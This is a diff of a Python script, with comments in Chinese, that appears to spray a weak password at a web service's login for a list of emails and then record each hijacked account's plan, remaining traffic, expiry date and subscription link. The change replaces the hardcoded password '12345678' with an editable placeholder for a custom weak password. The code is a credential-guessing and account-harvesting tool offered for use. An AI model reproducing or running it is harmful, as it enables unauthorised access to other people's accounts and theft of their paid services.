@@ -20,7 +20,7 @@ def get_user(email):
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '
                       'Safari/537.36'}
     post_data = {'email': email,
-                 'password': '12345678',
+                 'password': '自定义弱口令',
                  }
     try:
         resp = requests.post(url=login_url, data=post_data, headers=headers, proxies=proxies, timeout=20)  # 若存在SSL问题，使用verify=False（取消第5、27行注释）
@@ -57,7 +57,7 @@ def get_user(email):
                         expired_at = dateArray.strftime("%Y-%m-%d %H:%M:%S")
                     sub_plan = resp1.json()["data"]["plan"]["name"]
                     sub_plan1 = sub_plan.encode('unicode_escape').decode('unicode_escape')
-                    result_temp = '账号：' + email + '密码：' + '12345678' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'
+                    result_temp = '账号：' + email + '密码：' + '【自定义的弱口令】' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'  # 修改【自定义的弱口令】
                     print(result_temp)
                     result.append(result_temp)
                     time.sleep(1)
